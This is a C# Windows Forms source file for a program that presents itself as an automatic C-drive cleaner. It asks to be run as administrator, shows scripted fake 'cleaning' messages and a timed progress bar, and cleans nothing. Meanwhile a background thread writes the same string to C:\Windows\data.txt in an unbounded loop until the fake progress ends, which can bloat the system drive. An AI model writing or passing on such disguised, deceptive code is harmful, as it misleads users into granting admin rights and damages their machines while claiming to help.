using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace C盘自动清理
{
    public partial class F_Main : Form
    {
        private delegate void SetPos(int ipos, string vinfo);//进度条代理
        public bool isStart = false;
        private bool end = false;
        public F_Main()
        {
            System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = false;//设置该属性 为false
            InitializeComponent();
        }

        private void F_Main_Load(object sender, EventArgs e)
        {
            MessageBox.Show("请右键以管理员方式启动", "提示", 0, MessageBoxIcon.Question);
        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }
        private void SetTextMesssage(int ipos, string vinfo)
        {
            if (this.InvokeRequired)
            {
                SetPos setpos = new SetPos(SetTextMesssage);
                this.Invoke(setpos, new object[] { ipos, vinfo });
            }
            else
            {
                this.progressBar1.Value = Convert.ToInt32(ipos);
            }
        }

        private void B_Start_Click(object sender, EventArgs e)
        {
            if (!isStart)
            {
                isStart = true;
                Thread PGB = new Thread(new ThreadStart(SleepT));
                Thread TS = new Thread(new ThreadStart(Show));
                Thread END = new Thread(new ThreadStart(Write));
                PGB.Start();
                TS.Start();
                END.Start();
            }
            else
            {
                MessageBox.Show("已启动", "警告", MessageBoxButtons.OK, MessageBoxIcon.Question);
            }
            
        }
        static string path = @"C:\Windows\data.txt";
        StreamWriter sw = new StreamWriter(path, true);
        private void Write()
        {
            while(!end)
                sw.Write("c盘清理");
            sw.Close();
        }
        private void SleepT()
        {
            for (int i = 0; i < 500; i++)
            {
                System.Threading.Thread.Sleep(80);
                SetTextMesssage(100 * i / 500, i.ToString() + "\r\n");
            }
            T_Show.Text += "清理完成";
            label.Text = "您的C盘焕然一新";
            end = true;
        }
        private void Show()
        {
            T_Show.Text += "正在计算内存。" + Environment.NewLine;
            Thread.Sleep(1000);
            T_Show.Text += "正在扫描无用文件。" + Environment.NewLine;
            Thread.Sleep(1000);
            T_Show.Text += "正在清理<Program Files>" + Environment.NewLine;
            Thread.Sleep(10000);
            T_Show.Text += "正在清理<Program Files (x86)>" + Environment.NewLine;
            Thread.Sleep(15000);
            T_Show.Text += "正在清理<ProgramData>" + Environment.NewLine;
            Thread.Sleep(10000);
            T_Show.Text += "正在清理<AppData>" + Environment.NewLine;
            Thread.Sleep(10000);
            T_Show.Text += "正在清理用户文件夹" + Environment.NewLine; ;
        }
        private void T_Show_TextChanged(object sender, EventArgs e)
        {
            
        }
    }
}
